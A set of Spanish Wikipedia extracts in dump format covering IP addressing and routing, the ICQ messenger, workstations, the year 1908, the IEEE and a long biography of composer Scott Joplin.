Los sitios de Internet que por su naturaleza necesitan estar permanentemente conectados, generalmente tienen una "dirección IP fija" ("IP fija" o "IP estática"); es decir, no cambia con el tiempo. Los servidores de correo, dns, ftp públicos, servidores web, conviene que tengan una dirección IP fija o estática, ya que de esta forma se facilita su ubicación. 

Las máquinas manipulan y jerarquizan la información de forma numérica, y son altamente eficientes para hacerlo y ubicar direcciones IP. Sin embargo, los seres humanos debemos utilizar otra notación más fácil de recordar y utilizar, por ello las direcciones IP pueden utilizar un sinónimo, llamado nombre de dominio (Domain Name), para convertir los nombres de dominio en direcciones IP, se utiliza la resolución de nombres de dominio DNS.

En comunicaciones, el encaminamiento (a veces conocido por el anglicismo ruteo o enrutamiento) es el mecanismo por el que en una red los paquetes de información se hacen llegar desde su origen a su destino final, siguiendo un camino o ruta a través de la red. En una red grande o en un conjunto de redes interconectadas el camino a seguir hasta llegar al destino final puede suponer transitar por muchos nodos intermedios. 

Asociado al encaminamiento existe el concepto de métrica, que es una medida de lo "bueno" que es usar un camino determinado. La métrica puede estar asociada a distintas magnitudes: distancia, coste, retardo de transmisión, número de saltos, etc., o incluso a una combinación de varias magnitudes. Si la métrica es el retardo, es mejor un camino cuyo retardo total sea menor que el de otro. Lo ideal en una red es conseguir el encaminamiento óptimo: tener caminos de distancia (o coste, o retardo, o la magnitud que sea, según la métrica) mínimos. Típicamente el encaminamiento es una función implantada en la capa 3 (capa de red) del modelo de referencia OSI.




</doc>
<doc id="6489" url="https://es.wikipedia.org/wiki?curid=6489" title="ICQ">
ICQ

ICQ (""I seek you"", en castellano "te busco") es un cliente de mensajería instantánea y el primero de su tipo en ser ampliamente utilizado en Internet, mediante el cual es posible chatear y enviar mensajes instantáneos a otros usuarios conectados a la red de ICQ. También permite el envío de archivos, videoconferencias y charlas de voz.

ICQ fue creado por 2 jóvenes israelíes en 1996 con el nombre de Mirabilis con el propósito de introducir una nueva forma de comunicación sobre la Internet. El 8 de junio de 1998 la compañía fue adquirida por AOL por 287 millones de dólares. Hoy en día ICQ es usado por más de 38 millones de usuarios por todo el mundo. Según Time Warner, ICQ tiene más de 50 millones de cuentas registradas.

Desde abril de 2010 es propiedad de Mail.ru Group.

El protocolo de comunicaciones utilizado por ICQ es conocido como OSCAR, utilizado también por AIM. Los usuarios de la red ICQ son identificados con un número, el cual es asignado al momento de registrar un nuevo usuario, llamado UIN (""Universal Internet Number"" o "número universal de Internet"). Debido al gran número de usuarios de ICQ, las identificaciones de usuario más recientes se encuentran por encima del número 100.000.000. En algunos casos, los números más simples y fáciles de recordar son vendidos en subastas por Internet o incluso secuestrados por otros usuarios.




</doc>
<doc id="6493" url="https://es.wikipedia.org/wiki?curid=6493" title="Estación de trabajo">
Estación de trabajo

En informática una estación de trabajo (en inglés "workstation") es un computador de altas prestaciones destinado para trabajo técnico o científico. En una red de computadoras, es una computadora que facilita a los usuarios el acceso a los servidores y periféricos de la red. A diferencia de una computadora aislada, tiene una tarjeta de red y está físicamente conectada por medio de cables u otros medios no guiados con los servidores. Los componentes para servidores y estaciones de trabajo alcanzan nuevos niveles de rendimiento informático, al tiempo que ofrecen fiabilidad, compatibilidad, escalabilidad y arquitectura avanzada ideales para entornos multiproceso.

Lo de las computadoras en general, las computadoras promedio de hoy en día son más poderosas que las mejores estaciones de trabajo de una generación atrás. Como resultado, el mercado de las estaciones de trabajo se está volviendo cada vez más especializado, ya que muchas operaciones complejas que antes requerían sistemas de alto rendimiento pueden ser ahora dirigidas a computadores de propósito general. Sin embargo, el "hardware" de las estaciones de trabajo está optimizado para situaciones que requieren un alto rendimiento y fiabilidad, donde generalmente se mantienen operativas en situaciones en las cuales cualquier computadora personal tradicional dejaría rápidamente de responder. 

Actualmente las estaciones de trabajo suelen ser vendidas por grandes fabricantes de ordenadores como HP o Dell y utilizan CPU x86-64 como Intel Xeon o AMD Opteron ejecutando Microsoft Windows o GNU/Linux. Apple Inc. y Sun Microsystems comercializan también su propio sistema operativo tipo UNIX para sus estaciones de trabajo.

Las estaciones de trabajo fueron un tipo popular de computadoras para ingeniería, ciencia y gráficos durante las décadas de 1980 y 1990. Últimamente se las asocia con CPU RISC, pero inicialmente estaban basadas casi exclusivamente en la serie de procesadores Motorola 68000.

Las estaciones de trabajo han seguido un camino de evolución diferente al de las computadoras personales o PC. Fueron versiones de bajo costo de minicomputadoras como son las de la línea VAX, la cual había sido diseñada para sacar datos de tareas de cómputos más pequeñas de la muy cara computadora mainframe de la época. Rápidamente adoptaron un solo chip micropocesador de 32 bits, en oposición a los más costosos procesadores de multi-chip prevalecientes en aquel entonces. Posteriormente, las generaciones de estaciones de trabajo usaron procesadores RISC de 32 bits y 64 bits, que ofrecían un rendimiento más alto que los procesadores CISC usados en los computadoras personales.

Las estaciones de trabajo también corrían el mismo sistema operativo multi-usuario/multi-tarea que las microcomputadoras usaban, comúnmente Unix. También usaban redes para conectarse a computadoras más potentes para análisis de ingeniería y visualización de diseños. El bajo costo relativo a minicomputadoras y mainframes permitió una productividad total mayor a muchas compañías que usaban computadoras poderosas para el trabajo de cómputo técnico, ya que ahora cada usuario individual contaba con una máquina para tareas pequeñas y medianas, liberando así a las computadoras más grandes para los tratamientos por lotes. 

Las Computadoras personales, en contraste con las estaciones de trabajo, no fueron diseñadas para traer el rendimiento de la minicomputadora al escritorio de un ingeniero, sino que fueron previstas originalmente para el uso en casa o la productividad de oficina, la sensibilidad al precio fue un aspecto de consideración primaria. La primera computadora personal usaba un chip de procesador de 8 bits, especialmente los procesadores MOS Technology 6502 y Zilog Z80, en los días de Apple II, Atari 800, Commodore 64 y TRS-80. La introducción del IBM PC en 1981, basado en el diseño de procesador Intel x86, finalmente cambió la industria.

Los primeros sistemas operativos de PC fueron diseñados para ser de una sola tarea (MS DOS), luego incluyeron una limitada multitarea cooperativa (Windows 3.1) y últimamente han incluido multitarea con prioridad (Windows 95, Windows XP, GNU/Linux). Cada uno de estos diferentes tipos de sistemas operativos varía en la habilidad para utilizar la potencia total inherente del "hardware" para realizar múltiples tareas simultáneamente.

Tal vez la primera computadora que podría ser calificada como estación de trabajo fue la IBM 1620, una pequeña computadora científica diseñada para ser usada interactivamente por una sola persona sentada en la consola. Fue introducida en 1959. Una característica peculiar de la máquina era que carecía de cualquier tipo de circuito aritmético real. Para realizar la adición, requería una tabla almacenada en la memoria central con reglas decimales de la adición. Lo que permitía ahorrar en costos de circuitos lógicos, permitiendo a IBM hacerlo más económica. El nombre código de la máquina fue CADET, el cual algunas personas decían que significaba "No puede sumar, ni siquiera lo intenta ("Can't Add, Doesn't Even Try")". No obstante, se alquiló inicialmente por unos $1000 por mes. 

Posteriormente llegaron el IBM 1130 (sucesor del 1620 en 1965), y el minicomputador PDP-8 de Digital Equipment Corporation.

Las primeras "workstations" basadas en microordenadores destinados a ser utilizados por un único usuario fueron máquina Lisp del MIT a comienzos de la década de 1970, seguidas de los Xerox Alto (1973), PERQ (1979) y Xerox Star (1981).

En los años 1980 se utilizaron estaciones de trabajo basadas en CPU Motorola 68000 comercializadas por nuevas empresas como Apollo Computer, Sun Microsystems y SGI. Posteriormente llegarían NeXT y otras.

Desde finales de los años 1980 se fueron sustituyendo por equipos generalmente con CPU RISC diseñada por el fabricante del ordenador, con su sistema operativo propietario, casi siempre una variante de UNIX (con excepciones no basadas en UNIX, como OpenVMS o las versiones de Windows NT para plataformas RISC). Aunque también hubo estaciones de trabajo con CPU Intel x86 ejecutando Windows NT como las Intergraph "ViZual Workstation Zx" y varios modelos Compaq y Dell.

Lista no exhaustiva de las estaciones de trabajo RISC más famosas de los años 90:

En la actualidad se ha pasado de las arquitecturas RISC de IBM POWER, MIPS, SPARC, PA-RISC o DEC Alpha a la plataforma x86-64 con CPU Intel y AMD. Tras ser retiradas del mercado las Sun Ultra 25/45 en julio de 2008 y las IBM IntelliStation Power en enero de 2009, ya no se comercializan modelos con CPU RISC que tan comunes fueron en la década de 1990.

Así pues actualmente se utiliza normalmente CPU Intel Xeon o AMD Opteron, pudiendo usarse otras CPU x86-64 más comunes (como intel Core 2 o Core i5) en modelos más asequibles. Son comunes las GPU profesionales NVIDIA Quadro FX y ATI FireGL.

Lista de algunos fabricantes y modelos:







</doc>
<doc id="6495" url="https://es.wikipedia.org/wiki?curid=6495" title="1908">
1908

1908 (MCMVIII) fue un año bisiesto comenzando en miércoles en el calendario gregoriano.






























</doc>
<doc id="6498" url="https://es.wikipedia.org/wiki?curid=6498" title="Institute of Electrical and Electronics Engineers">
Institute of Electrical and Electronics Engineers

El Instituto de Ingeniería Eléctrica y Electrónica —conocido por sus siglas IEEE, leído "i-triple-e" en Latinoamérica o "i-e-cubo" en España; en inglés "Institute of Electrical and Electronics Engineers"— es una asociación mundial de ingenieros dedicada a la estandarización y el desarrollo en áreas técnicas. Con cerca de 425 000 miembros y voluntarios en 160 países, es la mayor asociación internacional sin ánimo de lucro formada por profesionales de las nuevas tecnologías, como ingenieros electricistas, ingenieros en electrónica, científicos de la computación, ingenieros en computación, matemáticos aplicados, ingenieros en biomedicina, ingenieros en telecomunicación, ingenieros en mecatrónica, ingenieros en telemática, ingenieros sociales, cibernéticos, ingenieros de sistemas, etc.

Su creación se remonta al año 1884, contando entre sus fundadores a personalidades de la talla de Thomas Alva Edison, Alexander Graham Bell y Franklin Leonard Pope. En 1963 adoptó el nombre de IEEE al fusionarse asociaciones con el AIEE ("American Institute of Electrical Engineers") y el IRE ("Institute of Radio Engineers").

Según el mismo IEEE, su trabajo es promover la creatividad, el desarrollo y la integración, compartir y aplicar los avances en las tecnologías de la información, electrónica y ciencias en general para beneficio de la humanidad y de los mismos profesionales. Algunos de sus estándares son:


Mediante sus actividades de publicación técnica, conferencias y estándares basados en consenso, el IEEE produce más del 30% de la literatura publicada en el mundo sobre ingeniería eléctrica de potencia, electrónica, en computación, telecomunicaciones, telemática, mecatrónica y tecnología de control y robótica, biomédica y biónica, procesamiento digital de señales, sistemas energéticos, entre otras ramas derivadas y correspondientes a la Ingeniería Eléctrica; organiza más de 1000 conferencias al año en todo el mundo, y posee cerca de 900 estándares activos, con otros 700 más bajo desarrollo.

El IEEE se encuentra agrupado en treinta y ocho sociedades enfocadas en un área de trabajo específico.
Estas sociedades proveen publicaciones especializadas, conferencias, redes de negocio entre otros servicios.

IEEE es una de las organizaciones líderes en la creación de estándares en el mundo. IEEE realiza sus estándares y mantiene las funciones a través de la Asociación de estándares IEEE . Estándares IEEE afectan a una amplia gama de industrias, incluyendo: potencia y energía, biomedicina y salud, tecnología de la información, las telecomunicaciones, el transporte, la nanotecnología, la seguridad de la información, y muchos más. En 2013, la IEEE tenía más de 900 estándares activos, con más de 500 normas en elaboración. Uno de los más notables estándares IEEE es la IEEE 802 LAN/MAN grupo de normas que incluye el estándar IEEE 802.3 Ethernet y el estándar IEEE 802.11 de red inalámbrica.




</doc>
<doc id="6506" url="https://es.wikipedia.org/wiki?curid=6506" title="Scott Joplin">
Scott Joplin

Scott Joplin (Texarkana, Texas, Estados Unidos, 24 de noviembre de 1868 - Manhattan, Nueva York, Estados Unidos, 1 de abril de 1917) fue un compositor y pianista afroamericano estadounidense, una de las figuras más importantes en el desarrollo del ragtime clásico, para el que deseaba un estatus similar al de la música seria proveniente de Europa y la posibilidad de admitir composiciones extensas como óperas y sinfonías. 

Joplin nació en una familia de obreros músicos en el noreste de Texas, y desarrolló su conocimiento musical con la ayuda de maestros locales. Creció en Texarkana, donde formó un cuarteto vocal, y enseñó mandolina y guitarra. Luego de viajar por el sur de EE.UU. fue a Chicago para la Feria Mundial de 1893, que desempeñó un papel importante en popularizar el ragtime para 1897.

En 1894 se muda a Sedalia (Missouri), donde se gana la vida como profesor de piano; ahí les enseñó a los futuros compositores de "ragtime" Arthur Marshall, Scott Hayden y Brun Campbell. Joplin comenzó a publicar música en 1895, y la publicación del "Maple Leaf Rag" le dio fama en 1899. En 1901 se mudó a Saint Louis, donde continuó componiendo y publicando, tocando con frecuencia en esa comunidad. Le confiscan la partitura de su primera ópera, "Un Invitado de Honor", por no pagar las cuentas, y ahora se considera perdida. En 1907 se muda a Nueva York para buscar un productor para una nueva ópera. Su segunda ópera, "Treemonisha", no fue bien recibida en su puesta en escena parcial de 1915.

En 1916 Joplin sufre de demencia como consecuencia de la sífilis. Se interna en un psiquiátrico en 1917 donde muere tres meses después, a los 49 años. Se considera ampliamente que la muerte de Joplin marcó el fin del "ragtime" como formato de música de tendencia, para evolucionar en los siguientes años hacia otros estilos y convertirse en "stride", "jazz", y eventualmente "swing" de Big Band. 

Su música fue redescubierta y volvió a ser popular a principios de la década de 1970, con el lanzamiento del álbum de Joshua Rifkin que vendió un millón de copias. Esto fue seguido de la película "El Golpe", ganadora del Óscar en 1973, que destacaba varias de sus composiciones, destacando "The Entertainer". La ópera "Treemonisha" fue finalmente producida por completo en 1972. En 1976 se le concedió a Joplin un premio Pulitzer póstumo.

Scott Joplin, a diferencia de otros músicos contemporáneos, tuvo una formación musical clásica muy sólida, lo que se materializó en su tendencia a obtener un equilibrio formal basándose en el uso de tonalidades muy próximas entre sí.

Sus "rags" se valen de distintos ritmos e incluyen, generalmente, cuatro temas de 16 compases repetidos, con introducción y modulación antes del tercer tema; tras la profusión de sonidos irregulares y arpegiados siempre se encuentra en sus "rags" una melodía de carácter pegadizo que sigue el clásico patrón de frase antecedente-consecuente, dividiéndose así la melodía de ocho compases en dos partes relacionadas entre sí. Por lo demás, sus "rags" carecen de pasajes de desarrollo.

Scott Joplin no grabó nunca discos, aunque sí algunos rollos de pianola a finales de 1915 o principios de 1916; su legado, por tanto, se centra casi exclusivamente en sus partituras, diseñadas "para una ejecución milimétrica y minuciosa por parte del artista".

Joplin nació en Linden (Texas), quizás a finales de 1867 o principios de 1868. Aunque durante muchos años se aceptó su fecha de nacimiento como 24 de noviembre de 1868, la investigación ha revelado que es casi sin duda inexacta (la fecha aproximada más probable sería el segundo semestre de 1867). Fue el segundo de seis hijos (los otros son Monroe, Robert, William, Myrtle y Ossie) nacidos de Giles Joplin, un exesclavo de Carolina del Norte, y de Florece Givens, una afroamericana nacida libre de Kentucky. Los Joplin posteriormente se trasladaron a Texarkana (Texas) donde Giles trabajó como peón para el ferrocarril mientras que Florence era mujer de la limpieza. El padre de Joplin había tocado el violín para las fiestas de la plantación en Carolina del Norte, y su madre cantaba y tocaba el banjo. Joplin recibió una rudimentaria educación musical de su familia y a la edad de siete años le fue permitido tocar el piano mientras su madre limpiaba.

En algún momento de principios de la década de 1880, Giles Joplin abandonó a la familia por otra mujer, dejando a Florence mantener a sus hijos con su trabajo doméstico. La biógrafa Susan Curtis especuló que el apoyo de su madre a la educación musical de Joplin fue un importante factor causal en esta separación. Su padre argumentaba que esto lo alejó de un empleo práctico que complementaría los ingresos familiares.

Según un amigo de la familia, el joven Joplin era serio y ambicioso, estudiaba música y tocaba el piano después de salir de la escuela. Mientras que algunos profesores locales le ayudaban, recibió mucha de su educación musical de Julius Weiss, un profesor de música judío-alemán que había inmigrado a los EE. UU. desde Alemania. Weiss había estudiado música en la universidad en Alemania y figuraba en los registros de la ciudad como "Profesor de música". Impresionado por el talento de Joplin, y dándose cuenta de la difícil situación de su familia, Weiss le enseñó música sin cobrarle nada. Tutorizó a Joplin desde los 11 hasta los 16 años, durante ese tiempo Weiss le introdujo en la música popular y en la clásica, incluyendo la ópera. Weiss ayudaba a Joplin a apreciar la música como un "arte y también un entretenimiento", y ayudó a su madre a adquirir un piano de segunda mano. De acuerdo con su esposa Lottie, Joplin nunca olvidó a Weiss y en sus últimos años, cuando él alcanzó fama como compositor, le enviaba a su antiguo profesor "... regalos de dinero cuando él estaba viejo y enfermo", hasta que Weiss murió. A la edad de 16 años Joplin actuaba en un cuarteto vocal con otros tres chicos en Texarkana y sus alrededores, tocando el piano. Además enseñó guitarra y mandolina.

Al final de la década de 1880, habiendo actuado en varios eventos locales como adolescente, Joplin optó por dejar el trabajo como empleado en el ferrocarril y abandonó Texarkana para convertirse en un músico itinerante. Poco se sabe sobre sus movimientos en este momento, a pesar de que se registra en Texarkana en julio de 1891 como miembro de los "Trovadores Texarkana" en una actuación que con el fin de recaudar fondos para un monumento a Jefferson Davis, Presidente de la Confederación del Sur. Él descubrió pronto, sin embargo, que había pocas oportunidades allí para los pianistas negros. Las iglesias y los burdeles estaban entre las pocas opciones de trabajo estable. Joplin tocó pre-ragtime "jig-piano" en varias zonas rojas, en distritos a lo largo del medio sur, y algunos reivindican que estuvo en Sedalia (Misuri) y Saint Louis durante este tiempo.

En 1893 Joplin estuvo en Chicago para la Feria Mundial. Durante su estancia en esa ciudad formó su primera banda tocando la corneta y empezó con arreglos musicales para que el grupo los interpretara. Aunque la Feria Mundial minimizó la participación de los afroamericanos, aun así los artistas negros actuaban en los bares, cafés y burdeles que rodeaban la feria. A la exposición asistieron 27 millones de americanos y tuvo un profundo efecto en muchas áreas de la vida cultural americana, incluyendo el "ragtime". Aunque la información específica es escasa, numerosas fuentes han asociado a la Feria Mundial de Chicago con la difusión de la popularidad del "ragtime". Joplin encontró que su música, así como la de otros artistas negros, era muy popular entre los visitantes. Para 1897 el ragtime se había convertido en una moda en las ciudades americanas y fue descrito por el "St. Louis Dispatch" como "...un verdadero llamado de la naturaleza, que agitó poderosamente el pulso de la gente de ciudad".

En 1894 Joplin arribó a Sedalia (Missouri). Al principio, Joplin se quedó con la familia de Arthur Marshall, en el momento un muchacho de trece años de edad, pero más tarde uno de los estudiantes de Joplin y compositor de "ragtime" por derecho propio. No hay registro de que Joplin tuviera una residencia permanente en la ciudad hasta 1904, porque hasta entonces llevaba una vida de músico itinerante.

Hay poca evidencia precisa conocida sobre las actividades de Joplin en este tiempo, a pesar de que actuó como solista en los bailes y en los principales clubes de negros en Sedalia, el club "Negro 400" y el "Club Hoja de Arce (Maple Leaf Club)". Actuó en la banda Queen City Cornet, y su propia orquesta de baile de seis piezas. Una gira con su propio grupo de canto, Texas Medley Quartet, le dio su primera oportunidad de publicar sus propias composiciones y se sabe que fue a Siracusa, Nueva York y Texas. Dos hombres de negocios de Nueva York publican los primeros dos trabajos de Joplin, las canciones "Please Say You Will" y "A Picture of her Face", en 1895. La visita de Joplin a Temple, Texas le permitió tener tres piezas publicadas allí en 1896, incluyendo "Great Crush Collision March", que conmemora un choque de trenes programado como espectáculo del ferrocarril Missouri-Kansas-Texas el 15 de septiembre de 1896 del que puede haber sido testigo. La marcha fue descrita por uno de los biógrafos de Joplin como un "especial...temprano ensayo de ragtime." Estando en Sedalia enseñaba piano a estudiantes entre quienes había futuros compositores de "ragtime" como el mencionado Arthur Marshall, Brun Campbel y Scott Hayden. De vuelta, Joplin se inscribió en el George R. Smith College, donde aparentemente estudió "...armonía avanzada y composición." Los registros de la universidad fueron destruidos en un incendio en 1925, y su biógrafo Edward A. Berlin señala que es poco probable que un pequeño colegio para afroamericanos pudiese ofrecer tal curso.

En 1899, Joplin se casa con Belle, la cuñada del colaborador Scott Hayden. Aunque había cientos de "rags" impresos en el momento en el que fue publicado el "Maple Leaf Rag", Joplin no se quedaba muy atrás. Su primer "rag" publicado, "Original Rags", se había completado en 1897, el mismo año del primer trabajo de "ragtime" impreso, el "Mississippi Rag", de William Krell. "Maple Leaf Rag" pudo probablemente haber sido conocido en Sedalia antes de su publicación en 1899; Brun Campbell reivindica haber visto el manuscrito del trabajo en aproximadamente 1898. Las circunstancias exactas que llevaron a la publicación del "Maple Leaf Rag" son desconocidas, y algunas versiones del evento se contradicen entre sí. Después de varias aproximaciones infructuosas a los editores, Joplin firmó un contrato el 10 de agosto de 1899 con John Stillwell Stark, un minorista de instrumentos musicales quien posteriormente se convirtió en su editor más importante. El contrato estipulaba que Joplin recibiría un 1% de derechos de autor sobre todas las ventas del rag, con un precio de venta mínimo de 25 centavos de dólar. Con la inscripción "Para el Maple Leaf Club" muy a la vista en la parte superior de al menos algunas ediciones, es probable que el "rag" fuera llamado así por la hoja de arce emblema del Club, aunque no hay evidencia directa que demostrara el vínculo, y había muchas otras fuentes posibles para el nombre en y alrededor de Sedalia en el momento.
Ha habido muchas aseveraciones respecto a las ventas del "Maple Leaf Rag", por ejemplo, que Joplin fue el primer músico en vender un millón de copias de una pieza de música instrumental. El primer biógrafo de Joplin, Rudi Blesh escribió que durante sus primeros seis meses, la pieza vendió 75.000 copias, y se convirtió en "... el primer gran éxito de una obra instrumental en América". Sin embargo, la investigación por el posterior biógrafo de Joplin, Edward A. Berlín demostró que este no fue el caso; a la tirada inicial de 400 le llevó un año venderse, y en los términos del contrato de Joplin con una regalía de 1% habría dado Joplin un ingreso de 4 dólares (o aproximadamente $ dólares al cambio actual). Más tarde las ventas se estabilizaron, y le podrían haber dado a Joplin unos ingresos que habrían cubierto sus gastos. En 1909, las ventas estimadas le habrían dado un ingreso de 600 dólares anualmente (aproximadamente $ dólares al cambio actual).

El "Maple Leaf Rag" sirvió de modelo para los cientos de "rags" por venir en futuras composiciones, especialmente en el desarrollo del "ragtime" clásico. Después de la publicación del "Maple Leaf Rag", Joplin fue pronto descrito como el "Rey de los escritores de Ragtime (King of rag time writers)", y nada menos que por él mismo en las portadas de su propio trabajo, tales como "The Easy Winners (Los ganadores fáciles)" y "Elite Syncopations (Élite sin igual)".

Después que los Joplin se trasladaron a Saint Louis a principios de 1900, tuvieron una hijita que murió a los pocos meses de nacer. La relación de Joplin con su mujer fue difícil porque ella no tenía interés por la música. Se separaron finalmente y luego se divorciaron. Por ese tiempo, Joplin colaboró con Scott Hayden en la composición de cuatro "rags". Fue en San Luis donde Joplin produjo algunos de sus más conocidos trabajos, incluyendo "The Entertainer (El Animador)", "Marzo Majestuoso" ("March Majestic)" y la breve obra teatral "The Ragtime Dance" ("La danza Rag"). 

En junio de 1904, Joplin se casa con Freddie Alexander de Little Rock (Arkansas), la joven a quien dedicó "The Chrysanthemum" ("El Crisantemo"). Ella murió el 10 de septiembre de ese mismo año por las complicaciones resultantes de un resfriado, diez semanas después de su boda. El primer trabajo de Joplin con derechos de autor después de la muerte de Freddie, "Bethena", fue descrito por un biógrafo como "una encantadoramente maravillosa pieza que está entre las más grandes de los vals del "ragtime"."

Durante este tiempo, Joplin creó una compañía de ópera de 30 personas y produjo su primera ópera "Un invitado de honor" ("A Guest of Honor") para una gira nacional. No es seguro cuantas producciones fueron puestas en escena, o incluso si este fue un espectáculo de negros o una producción de razas mezcladas. Durante la gira, ya sea en Springfield (Illinois), o Pittsburg (Kansas), alguien relacionado con la empresa robó los ingresos de la caja. Joplin no podría pagar la nómina de sueldos de su compañía o pagar por su alojamiento en una casa de hospedaje teatral. Se cree que la partitura de "Un invitado de honor" ("A Guest of Honor") se perdió, quizás destruida debido a la falta de pago de la factura de la casa de hospedaje de la compañía.

En 1907, Joplin se trasladó a la ciudad de Nueva York, la cual creía que era el mejor lugar para encontrar un productor para una nueva ópera. Después de su mudanza a Nueva York, Joplin conoció a Lottie Stokes, con quien se casó en 1909. En 1911, incapaz de encontrar un editor, Joplin emprendió la carga financiera de publicar "Treemonisha" él mismo en formato piano-vocal. En 1915, como un último esfuerzo para verla realizada, invitó a una pequeña audiencia para oírla en una sala de ensayo en Harlem. Pobremente escenificado y con sólo Joplin en acompañamiento de piano, fue "un fracaso miserable" para un público que no está listo para formas de música negra "crudas" tan diferentes de la europea y de la gran ópera de la época. El público, incluyendo patrocinadores potenciales, fue indiferente y se marchó. Scott escribe que "luego de una desastrosa actuación individual... Joplin sufrió una desilusión. Él estaba en bancarrota, desanimado y agotado." Llega a la conclusión de que pocos artistas americanos de su generación se enfrentaron a estos obstáculos: "Treemonisha" pasó inadvertida y sin crítica, en gran parte porque Joplin había abandonado la música comercial en favor de la música artística, un campo cerrado para los afroamericanos. De hecho, no fue hasta la década de 1970 que esta ópera recibió una puesta en escena teatral completa.

En 1914, Joplin y Lottie autopublicaron su "Magnetic Rag" como la "Compañía de Música Scott Joplin (Scott Joplin Music Company)", que se había formado el diciembre anterior. La biógrafa Vera Brodsky Lawrence especula que Joplin fue consciente de su avanzado deterioro debido a la sífilis y estaba "...deliberadamente corriendo contra el reloj." En sus notas de contratapa del lanzamiento de "Treemonisha" en 1992 por Deutsche Grammophon, señala que "... se hundió febrilmente en la tarea de orquestar su ópera, día y noche, con su amigo Sam Patterson preparado para copiar las partes, página por página, a medida que cada página de la partitura entera se completaba".

Para 1916, Joplin estaba padeciendo de la fase final de sífilis y su consecuente caída en la demencia. En enero de 1917 fue admitido en el Hospital Estatal de Manhattan, un psiquiátrico. Muere allí el 1 de abril de demencia sifilítica, a la edad de 49 años y es enterrado en una fosa común que quedaría sin marcar por 57 años. Se le obsequió su tumba con nombre en el Cementerio San Miguel, en el este de Elmhurs, finalmente en 1974.

Por orden alfabético (entre paréntesis, el año del "copyright"):


La combinación de la música clásica, el ambiente musical presente alrededor de Texarkana —incluyendo canciones de trabajo, góspel, espiritual y música de baile— y la capacidad natural de Joplin ha sido citada como una contribución significativa a la invención de un nuevo estilo que mezcló los estilos musicales afroamericanos con formas y melodías europeas, y se hizo famoso por primera vez en la década de 1890: el ragtime.

Cuando Joplin estaba aprendiendo piano, los círculos musicales formales condenaron el ragtime debido a su asociación con canciones vulgares y tontas "... estampados por los fabricantes de melodías de Tin Pan Alley." Como compositor Joplin refinó el ragtime, elevándolo por encima de la forma baja y basta tocada por los "... vagantes pianistas de burdel... que tocaban mera música de baile" de la imaginación popular. Esta nueva forma de arte, el rag clásico, combinó la síncopa de la música popular afroamericana y el romanticismo europeo del siglo XIX, con sus esquemas armónicos y sus tempos como de marcha. En palabras de un crítico, "el ragtime era básicamente ... una versión afroamericana de la polca, o su análoga, la marcha de estilo Sousa." Con esto como base, Joplin destinó sus composiciones a ser reproducidas exactamente como él las escribió  –sin improvisación. Joplin escribe sus rags como música "clásica" en versión reducida, con el fin de elevar el ragtime por encima de sus orígenes de "burdel barato" y crear una obra que la historiadora de ópera Elise Kirk describió como "... más melódica, a contrapunto, pegadiza y armónicamente colorida que ninguna otra de su época."

Algunos especulan con que los logros de Joplin estuvieron influenciados por su profesor de música alemán Julius Weiss, formado en clásica, que le pudo haber traído una sensibilidad rítmica de polca del viejo país al Joplin de 11 años. Como Curtis dijo, "el alemán educado podría abrir la puerta a un mundo de aprendizaje y música de la cual el joven Joplin fue en gran parte inconsciente."

El primer y más significativo éxito de Joplin, el Maple Leaf Rag, fue descrito como el arquetipo del rag clásico, e influyó en compositores de rag posteriores durante al menos 12 años después de su publicación inicial, gracias a sus patrones rítmicos, líneas melódicas y armonía, aunque con la excepción de Joseph Lamb, generalmente fallaban en ampliarlo.

La escena de la ópera es una antigua comunidad de esclavos en un bosque aislado cerca de Texarkana, la ciudad de la infancia de Joplin, en septiembre de 1884. La trama se centra en una joven de 18 años, Treemonisha, a quien le enseña a leer una mujer blanca, y que luego lidera su comunidad contra la influencia de charlatanes que se aprovechan de la ignorancia y la superstición. Treemonisha es secuestrada y está a punto de ser arrojada en un nido de avispas cuando su amigo Remus la rescata. La comunidad se da cuenta del valor de la educación y la responsabilidad de la ignorancia de ellos para luego elegirla como su maestra y líder.

Joplin escribió tanto la partitura como el libreto para la ópera, que en gran medida imita el tipo de ópera europeo, con muchas arias tradicionales, ensembles y coros. Además, los temas de superstición y misticismo evidente en "Treemonisha" son comunes en la tradición operística, y ciertos aspectos se hacen eco de formas del trabajo del compositor alemán Richard Wagner (de lo cual Joplin era consciente). Un árbol sagrado bajo el que Treemonisha se sienta recuerda el árbol del que Siegmund saca su espada encantada en "Die Walküre", y el recuento del origen de la protagonista se hace eco de aspectos de la ópera Sigfrido. Además, los cuentos del folclore afroamericano influyen en la historia -el incidente del avispero es similar al relato de El Hermano Conejo y El Hermano Zorro y el matorral.

"Treemonisha" no es una ópera ragtime porque Joplin empleó los estilos del ragtime y otras músicas negras frugalmente, usándolas para transmitir un "carácter racial", y celebrar la música de su infancia en los finales del siglo XIX. La ópera se ha visto como un valioso registro de la música rural negra del tardío siglo XIX recreada por un "hábil y sensitivo participante".

Berlín especula sobre paralelismos entre el argumento y la propia vida de Joplin. Él observa que Lottie Joplin (la tercera esposa del compositor) vio una conexión entre los deseos de Treemonisha de sacar a su pueblo de la ignorancia y un deseo similar en el compositor. Además se ha especulado con que Treemonisha representa a Freddie, la segunda esposa de Joplin, porque la fecha del desarrollo de la ópera era probablemente la fecha del mes de su nacimiento.

Al tiempo de la publicación de la ópera en 1911, el "American Musician and Art Journal" lo elogió como "...una forma completamente nueva de arte operístico". Después los críticos han elogiado la ópera como ocupando un lugar especial en la historia americana, con su heroína, "...una sorprendentemente temprana voz para las causas modernas de los derechos civiles, notablemente la importancia de la educación y conocimiento del ascenso afro-americano." La conclusión de Curtis es similar: "En el final, "Treemonisha" ofrecía una celebración de literatura, aprendizaje, trabajo duro y solidaridad comunitaria como la mejor fórmula para el avance de la raza". Berlín la describe como "... una ópera fina, ciertamente más interesante que muchas óperas siendo escritas en los Estados Unidos," pero más tarde señala que el propio libreto de Joplin mostró al compositor, "... no era un dramaturgo competente," con el libro no llega a la calidad de la música.

Las habilidades de Joplin como pianista fueron descritas en términos brillantes por un periódico de Sedalia en 1898, y los compañeros compositores de ragtime, Arthur Marshall y Joe Jordan dijeron que tocaba bien el instrumento. Sin embargo el hijo del editor John Stark afirmaba que Joplin era un pianista más bien mediocre y que compuso sobre papel, en vez de en el piano. Artie Matthews recordó el deleite que los músicos de St. Louis sentían por tocar mejor que Joplin.

